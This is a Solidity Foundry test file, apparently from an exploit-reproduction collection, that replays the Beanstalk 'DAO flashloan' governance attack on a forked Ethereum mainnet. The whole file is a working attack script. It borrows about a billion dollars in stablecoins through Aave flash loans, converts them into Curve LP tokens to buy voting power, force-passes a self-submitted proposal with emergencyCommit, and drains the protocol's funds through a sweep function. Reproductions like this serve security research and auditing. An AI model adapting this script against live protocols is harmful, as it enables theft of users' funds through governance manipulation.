this is a hacker attack called DAO flashloan 

// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  ILendingPool aavelendingPool =
    ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
  IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
  IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
  IERC20 bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
  IERC20 crvbean = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
  IERC20 threeCrv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
  IUniswapV2Router uniswapv2 =
    IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
  ICurvePool threeCrvPool =
    ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
  ICurvePool bean3Crv_f =
    ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
  IBeanStalk siloV2Facet =
    IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
  IBeanStalk beanstalkgov =
    IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
  address maliciousProposal = 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69;
  uint32 bip = 18;

  constructor() {
    cheat.createSelectFork("mainnet", 14595905); // fork mainnet at block 14595905
  }

  function testExploit() public {
    address[] memory path = new address[](2);
    path[0] = uniswapv2.WETH();
    path[1] = address(bean);
    uniswapv2.swapExactETHForTokens{ value: 75 ether }(
      0,
      path,
      address(this),
      block.timestamp + 120
    );
    emit log_named_uint(
      "Initial USDC balancer of attacker",
      usdc.balanceOf(address(this))
    );

    emit log_named_uint(
      "After initial ETH -> BEAN swap, Bean balance of attacker:",
      bean.balanceOf(address(this)) / 1e6
    );
    bean.approve(address(siloV2Facet), type(uint256).max);
    siloV2Facet.depositBeans(bean.balanceOf(address(this)));
    emit log_named_uint(
      "After BEAN deposit to SiloV2Facet, Bean balance of attacker:",
      bean.balanceOf(address(this)) / 1e6
    );
    IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
    bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);
    //emit log_named_uint("BIP:", bip);
    // function propose(
    //     IDiamondCut.FacetCut[] calldata _diamondCut,
    //     address _init,
    //     bytes calldata _calldata,
    //     uint8 _pauseOrUnpause
    // )
    // https://dashboard.tenderly.co/tx/mainnet/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f
    beanstalkgov.propose(_diamondCut, address(this), data, 3);

    cheat.warp(block.timestamp + 24 * 60 * 60); //travelling 1 day in the future

    dai.approve(address(aavelendingPool), type(uint256).max);
    usdc.approve(address(aavelendingPool), type(uint256).max);
    TransferHelper.safeApprove(
      address(usdt),
      address(aavelendingPool),
      type(uint256).max
    );
    bean.approve(address(aavelendingPool), type(uint256).max);
    dai.approve(address(threeCrvPool), type(uint256).max);
    usdc.approve(address(threeCrvPool), type(uint256).max);
    TransferHelper.safeApprove(
      address(usdt),
      address(threeCrvPool),
      type(uint256).max
    );
    bean.approve(address(siloV2Facet), type(uint256).max);
    threeCrv.approve(address(bean3Crv_f), type(uint256).max);
    IERC20(address(bean3Crv_f)).approve(
      address(siloV2Facet),
      type(uint256).max
    );


    address[] memory assets = new address[](3);
    assets[0] = address(dai);
    assets[1] = address(usdc);
    assets[2] = address(usdt);

    uint256[] memory amounts = new uint256[](3);
    amounts[0] = 350_000_000 * 10**dai.decimals();
    amounts[1] = 500_000_000 * 10**usdc.decimals();
    amounts[2] = 150_000_000 * 10**usdt.decimals();

    uint256[] memory modes = new uint256[](3);
    aavelendingPool.flashLoan(
      address(this),
      assets,
      amounts,
      modes,
      address(this),
      new bytes(0),
      0
    );
    emit log_named_uint(
      "After Flashloan repay, usdc balance of attacker:",
      usdc.balanceOf(address(this))
    );
    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
  }

  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool) {
    emit log_named_uint(
      "After deposit, Bean balance of attacker:",
      bean.balanceOf(address(this)) / 1e6
    ); // @note redundant log
    uint256[3] memory tempAmounts;
    tempAmounts[0] = amounts[0];
    tempAmounts[1] = amounts[1];
    tempAmounts[2] = amounts[2];
    threeCrvPool.add_liquidity(tempAmounts, 0);
    uint256[2] memory tempAmounts2;
    tempAmounts2[0] = 0;
    tempAmounts2[1] = threeCrv.balanceOf(address(this));
    bean3Crv_f.add_liquidity(tempAmounts2, 0);
    emit log_named_uint(
      "After adding 3crv liquidity , bean3Crv_f balance of attacker:",
      crvbean.balanceOf(address(this))
    );
    emit log_named_uint(
      "After Curvebean3Crv_f balance of attacker:",
      IERC20(address(bean3Crv_f)).balanceOf(address(this))
    ); //@note logging balance for same token ?
    siloV2Facet.deposit(
      address(bean3Crv_f),
      IERC20(address(bean3Crv_f)).balanceOf(address(this))
    );
    //beanstalkgov.vote(bip); --> this line not needed, as beanstalkgov.propose() already votes for our bip
    beanstalkgov.emergencyCommit(bip);
    emit log_named_uint(
      "After calling beanstalkgov.emergencyCommit() , bean3Crv_f balance of attacker:",
      crvbean.balanceOf(address(this))
    );
    bean3Crv_f.remove_liquidity_one_coin(
      IERC20(address(bean3Crv_f)).balanceOf(address(this)),
      1,
      0
    );
    emit log_named_uint(
      "After removing liquidity from crvbean pool , bean3Crv_f balance of attacker:",
      crvbean.balanceOf(address(this))
    );
    tempAmounts[0] = amounts[0] + premiums[0];
    tempAmounts[1] = amounts[1] + premiums[1];
    tempAmounts[2] = amounts[2] + premiums[2];
    emit log_named_uint("premiums[0]:", premiums[0]);
    emit log_named_uint("premiums[1]:", premiums[1]);
    emit log_named_uint("premiums[2]:", premiums[2]);
    emit log_named_uint("tempAmounts[0]:", tempAmounts[0]);
    emit log_named_uint("tempAmounts[1]:", tempAmounts[1]);
    emit log_named_uint("tempAmounts[2]:", tempAmounts[2]);

    threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);
    threeCrvPool.remove_liquidity_one_coin(
      threeCrv.balanceOf(address(this)),
      1,
      0
    );

    emit log_named_uint(
      "After removing 3crv liquidity from 3crv pool, usdc balance of attacker:",
      usdc.balanceOf(address(this))
    );

    return true;
  }

  function sweep() external {
    IERC20 erc20bean3Crv_f = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    erc20bean3Crv_f.transfer(
      msg.sender,
      erc20bean3Crv_f.balanceOf(address(this))
    ); //Just for verification, so keep other tokens
  }
}
